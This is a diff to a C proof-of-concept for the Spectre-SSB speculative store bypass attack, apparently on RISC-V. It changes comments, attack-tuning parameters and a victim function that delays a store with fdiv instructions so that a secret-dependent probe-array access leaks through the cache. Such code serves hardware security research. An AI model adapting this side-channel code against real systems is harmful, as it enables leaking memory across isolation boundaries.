@@ -22,7 +22,7 @@
  * The following parameters vary with machines and are obtained from experiments,
  * using "control variates method" and "binary/half-interval/logarithmic search/".
  */
-//#define TRAIN_TIMES 24 // (Spectre-SSB does not need trainning.) Times to train the predictor. There shall be an ideal value for each machine.
+//#define TRAIN_TIMES 24 // (Spectre-SSB does not need training.) Times to train the predictor. There shall be an ideal value for each machine.
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
 #define ATTACK_ROUNDS 3 // used to be 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
@@ -108,14 +108,14 @@ uint32_t tempString[ARRAY_SIZE_FACTOR];
 /**
  * @input idx input to be used to idx the array
  */
-//void victimFunc(uint32_t targetAddr, uint32_t idx){
-//void victimFunc(uint32_t targetAddr){
 void victimFunc(uint32_t targetIdx){
 
+//
 	// "Slowly" store a value at a memory location (here *memoryDestination).
 //	char **memoryDestination = *delayer;
 	// "Quickly" load that value from that memory location.
 //	*memoryDestination = knownString;
+
 //	tempStringIndex = idx; 
 	tempString[1] = targetIdx;//tempString[idx]=
 	tempStringIndex = tempStringIndex << 4;
@@ -125,6 +125,7 @@ void victimFunc(uint32_t targetIdx){
 		"fdiv.s	fa5, fa5, fa4\n"
 		"fdiv.s	fa5, fa5, fa4\n"
 		"fdiv.s	fa5, fa5, fa4\n"
+		// Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
 //		"fdiv.s	fa5, fa5, fa4\n"
 //		"fdiv.s	fa5, fa5, fa4\n"
 //		"fdiv.s	fa5, fa5, fa4\n"
@@ -135,7 +136,7 @@ void victimFunc(uint32_t targetIdx){
 		: "fa4", "fa5");
 
 	tempString[tempStringIndex] = 0;
-	// Will only succeed on machines with MDP (Memory Dependence Prediction) mechanism.
+	// Will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
 //	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
 	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
 
